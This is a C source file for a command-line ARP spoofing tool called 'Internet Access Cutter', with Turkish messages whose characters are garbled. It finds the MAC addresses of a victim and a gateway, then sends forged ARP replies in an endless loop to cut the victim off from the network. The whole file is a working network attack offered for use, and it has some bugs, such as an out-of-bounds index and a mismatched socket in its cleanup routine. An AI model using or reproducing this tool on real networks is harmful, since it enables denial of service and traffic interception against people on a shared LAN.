#include<stdio.h>
#include<string.h>

#include<stdlib.h>
#include<stdint.h>

#include<unistd.h>
#include<signal.h>

#include<sys/socket.h>
#include<sys/types.h>
#include<sys/ioctl.h>

#include<arpa/inet.h>

#include<netinet/in.h>
#include<netinet/if_ether.h>

#include<net/if.h>
#include<net/ethernet.h>

#include<netpacket/packet.h>

#define IFACE_ADDRESS_BASE_LOC "/sys/class/net"
#define PKT_LEN 1024
#define ARP_PING_LEN 42


int sockfd;

unsigned int local_ipv4[4]   = {};
unsigned int local_mac[6]    = {};
unsigned int target_ipv4[4]  = {};
unsigned int target_mac[6]   = {};
unsigned int gateway_ipv4[4] = {};
unsigned int gateway_mac[6]  = {};

struct sockaddr_ll device;

int8_t OFFSETS[] = { 6, 22, 28, 32, 38 };

uint8_t arp_ping_packet[ARP_PING_LEN] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
				  	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x06, 0x00, 0x01,
0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
				  	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			  	  	  0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				  	  0x00, 0x00, 0x00, 0x00
};

uint8_t arp_poison_target_packet[ARP_PING_LEN] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			   		    	   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x06, 0x00, 0x01,
0x08, 0x00, 0x06, 0x04, 0x00, 0x02,
					    	   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					    	   0x00, 0x00, 0x00, 0x00,
					    	   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					    	   0x00, 0x00, 0x00, 0x00
};

void cleanup() {
	printf("\033[32mRe-ARPing Hedefleri...\n\033[0m");

	for(int i = 0; i < 6; ++i) {
		arp_poison_target_packet[0+i] = target_mac[i];
		arp_poison_target_packet[OFFSETS[0]+i] = gateway_mac[i];
		arp_poison_target_packet[OFFSETS[1]+i] = gateway_mac[i];
		arp_poison_target_packet[OFFSETS[3]+i] = target_mac[i];
	}
	for(int i = 0; i < 4; ++i) {
		arp_poison_target_packet[OFFSETS[2]+i] = gateway_ipv4[i];
		arp_poison_target_packet[OFFSETS[4]+i] = target_ipv4[4];
	}

	for(int i = 0; i < 10; ++i) {
		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
		sleep(3);
	}

	close(sockfd);
	printf("\033[?25h");
	exit(0);
}

int main(int argc, char ** argv) {
        printf("\t\t\033[31m > Internet Access Cutter < \033[0m\n");
        printf("\t\t\033[42m > Created By Mars < \033[0m\n");


        printf("\033[0m");

	if(!argv[1]) {
		printf("\033[34m\nAray??z Ad??na ??htiyac??n??z Var\nKullan??m : $ %s \033[01;05;37m<ARAY??Z>\033[0m <HEDEF IP> <BA??LANTI IP>\n\n", argv[0]);
		return -1;
	} else if(!argv[2]) {
		printf("\033[34m\nHedef IP ??htiyac??n??z Var\nKullan??m : $ %s <ARAY??Z> \033[01;05;37m<HEDEF IP>\033[0m <BA??LANTI IP>\n\n", argv[0]);
		return -1;
	} else if(!argv[3]) {
		printf("\033[34m\nBa??lant?? IP ??htiyac??n??z Var\nKullan??m : $ %s <ARAY??Z> <HEDEF IP> \033[01;05;37m<BA??LANTI IP>\033[0m\n\n", argv[0]);
		return -1;
	}

	char * interface  = argv[1];
	char * target_ip  = argv[2];
	char * gateway_ip = argv[3];

	char   packet_buffer[PKT_LEN*8];
	struct ether_arp * arp = (struct ether_arp*)(packet_buffer + sizeof(struct ether_header));
	struct ifreq ifr;

	int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if(sockfd < 0) {
		printf("\033[41m Soket Olu??turulurken Hata Olu??tu\n\033[0m");
		perror("");
		return -1;
	}

	signal(SIGINT, cleanup);

	struct timeval timeout;
	timeout.tv_sec  = 0;
	timeout.tv_usec = 500000;

	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

	printf("\n\033[42m Aray??z Detaylar?? Al??n??yor... \033[0m");

	char address_f_location[128];
	char interface_mac_address[32];
	char ch;
	snprintf(address_f_location, sizeof(address_f_location), "%s/%s/address", IFACE_ADDRESS_BASE_LOC, interface);
	FILE * address_location = fopen(address_f_location, "r");
	if(address_location == NULL) {
		printf("\n\033[41m Arabirim i??in Yerel MAC Adresi Bulunamad?? !%s\033[0m");
		perror("");
		return -1;
	}

	int i = 0;
	while((ch = fgetc(address_location)) != EOF) {
		snprintf(interface_mac_address+i, sizeof(interface_mac_address), "%c", ch);
		++i;
	}
	interface_mac_address[strlen(interface_mac_address)-1] = '\0';

	int tmp_sock = socket(AF_INET, SOCK_DGRAM , 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(tmp_sock, SIOCGIFADDR, &ifr);

	char interface_ip[32];
	strncpy(interface_ip, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), sizeof(interface_ip));

	printf("\033[01;37m\n Ayg??t %s:\n\tIP  - %s\n\tMAC - %s\n\n\033[0m",interface, interface_ip, interface_mac_address);
	printf("\033[32mHedef Ayr??nt??lar?? Yap??land??r??l??yor...\033[0m");

	sscanf(interface_ip, "%d.%d.%d.%d", (unsigned int*)&local_ipv4[0],
					    (unsigned int*)&local_ipv4[1],
					    (unsigned int*)&local_ipv4[2],
					    (unsigned int*)&local_ipv4[3]
	);
	sscanf(interface_mac_address, "%x:%x:%x:%x:%x:%x", (unsigned int *)&local_mac[0],
							   (unsigned int *)&local_mac[1],
							   (unsigned int *)&local_mac[2],
							   (unsigned int *)&local_mac[3],
							   (unsigned int *)&local_mac[4],
							   (unsigned int *)&local_mac[5]
	);

	sscanf(target_ip, "%d.%d.%d.%d", (unsigned int*)&target_ipv4[0],
					 (unsigned int*)&target_ipv4[1],
					 (unsigned int*)&target_ipv4[2],
					 (unsigned int*)&target_ipv4[3]
	);

	sscanf(gateway_ip, "%d.%d.%d.%d", (unsigned int*)&gateway_ipv4[0],
					  (unsigned int*)&gateway_ipv4[1],
					  (unsigned int*)&gateway_ipv4[2],
					  (unsigned int*)&gateway_ipv4[3]
	);

	printf("\033[32m Bitti \n\033[0m");
	printf("\033[33m ARP Ping ??ste??i Haz??rlan??yor... \033[0m");

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = if_nametoindex(interface);
	device.sll_family  = AF_PACKET;
	device.sll_halen   = htons(ETH_ALEN);
	memcpy(device.sll_addr, local_mac, ETH_ALEN);

	for(int i = 0; i < 6; ++i) {
		arp_ping_packet[OFFSETS[0]+i] = local_mac[i];
		arp_ping_packet[OFFSETS[1]+i] = local_mac[i];
	}
	for(int i = 0; i < 4; ++i) {
		arp_ping_packet[OFFSETS[2]+i] = local_ipv4[i];
		arp_ping_packet[OFFSETS[4]+i] = target_ipv4[i];
	}

	printf("\033[32m Bitti \n\n\033[0m");
	printf("\033[33m Hedef Ayr??nt??lar?? Al??n??yor... \n\033[0m");

	if((sendto(sockfd, arp_ping_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device))) < 0) {
		printf("\033[41m ARP Ping G??nderilemedi! \n\033[0m");
		perror("");
		return -1;
	}

	printf("\n\033[42m ARP Ping Ba??ar??yla G??nderildi! \033[0m");
	printf("\033[33m Yan??t Bekleniyor... \033[0m");

	uint8_t arp_reply[1024];
	int recv_stat;

	if((recv_stat = recv(sockfd, arp_reply, sizeof(arp_reply), 0)) < 0) {
		printf("\n\033[41m Recv() Yan??t Vermedi! \033[0m");
		perror("");
		return -1;
	}

	printf("\033[32m Bitti \n\n\033[0m");

	for(int i = 0; i < 6; ++i) target_mac[i] = arp_reply[6+i];

	printf("\033[01;37m Hedef Ayr??nt??lar??:\n\tIP  - %s\n\tMAC - %02x:%02x:%02x:%02x:%02x:%02x\n\n\033[0m", target_ip,
									   target_mac[0],
									   target_mac[1],
									   target_mac[2],
									   target_mac[3],
									   target_mac[4],
									   target_mac[5]
	);

	printf("\033[33m Ba??lant?? Ayr??nt??lar?? Al??n??yor... \n\033[0m");

	for(int i = 0; i < 4; ++i) arp_ping_packet[OFFSETS[4]+i] = gateway_ipv4[i];

	if((sendto(sockfd, arp_ping_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device))) < 0) {
		printf("\033[41m ARP Ping G??nderilemedi! \n\033[0m");
		perror("");
		return -1;
	}

	printf("\n\033[42m ARP Ping Ba??ar??yla G??nderildi! \033[0m");
	printf("\033[33m Yan??t Bekleniyor... \033[0m");

	if((recv_stat = recv(sockfd, arp_reply, sizeof(arp_reply), 0)) < 0) {
		printf("\n\033[41m Recv() Yan??t Vermedi! \033[0m");
		perror("");
		return -1;
	}

	printf("\033[32m Bitti \n\n\033[0m");

	for(int i = 0; i < 6; ++i) gateway_mac[i] = arp_reply[6+i];

	printf("\033[01;37m Ba??lant?? Ayr??nt??lar??:\n\tIP  - %s\n\tMAC - %02x:%02x:%02x:%02x:%02x:%02x\n\n\033[0m", gateway_ip,
									   gateway_mac[0],
									   gateway_mac[1],
									   gateway_mac[2],
									   gateway_mac[3],
									   gateway_mac[4],
									   gateway_mac[5]
	);


	for(int i = 0; i < 6; ++i) {
		arp_poison_target_packet[0+i] = target_mac[i];
		arp_poison_target_packet[OFFSETS[0]+i] = local_mac[i];
		arp_poison_target_packet[OFFSETS[1]+i] = local_mac[i];
		arp_poison_target_packet[OFFSETS[3]+i] = target_mac[i];
	}
	for(int i = 0; i < 4; ++i) {
		arp_poison_target_packet[OFFSETS[2]+i] = gateway_ipv4[i];
		arp_poison_target_packet[OFFSETS[4]+i] = target_ipv4[i];
	}

	printf("\033[32mHedefe Sald??r??l??yor.. [IPTAL ETMEK ICIN CTRL-C] \n\033[?25l\033[0m");
	int sent = 1;

	while(1) {
		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
		sleep(3);
	}

	return 0;
}

